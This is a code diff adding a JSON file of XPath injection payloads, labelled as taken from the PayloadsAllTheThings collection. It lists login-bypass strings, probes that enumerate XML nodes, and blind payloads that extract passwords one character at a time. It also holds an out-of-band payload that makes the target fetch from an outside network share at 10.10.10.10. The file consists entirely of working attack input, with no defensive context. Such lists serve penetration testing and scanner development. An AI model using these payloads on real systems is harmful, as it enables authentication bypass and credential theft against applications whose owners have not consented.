@@ -1,0 +1,38 @@
+{
+  "source": "PayloadsAllTheThings",
+  "exploit_type": "xpath_injection",
+  "original_category": "XPATH Injection",
+  "payloads": [
+    {
+      "category": "Methodology",
+      "escalation": "baseline",
+      "lines": [
+        "string(//user[name/text()='\" +vuln_var1+ \"' and password/text()='\" +vuln_var1+ \"']/account/text())",
+        "' or '1'='1",
+        "' or ''='",
+        "x' or 1=1 or 'x'='y",
+        "/",
+        "//",
+        "//*",
+        "*/*",
+        "@*",
+        "count(/child::node())",
+        "x' or name()='username' or 'x'='y",
+        "' and count(/*)=1 and '1'='1",
+        "' and count(/@*)=1 and '1'='1",
+        "' and count(/comment())=1 and '1'='1",
+        "')] | //user/*[contains(*,'",
+        "') and contains(../password,'c",
+        "') and starts-with(../password,'c"
+      ]
+    },
+    {
+      "category": "Out Of Band Exploitation",
+      "escalation": "baseline",
+      "lines": [
+        "http://example.com/?title=Foundation&type=*&rent_days=* and doc('//10.10.10.10/SHARE')"
+      ]
+    }
+  ],
+  "converted_at": "2026-04-03T07:48:28.865Z"
+}
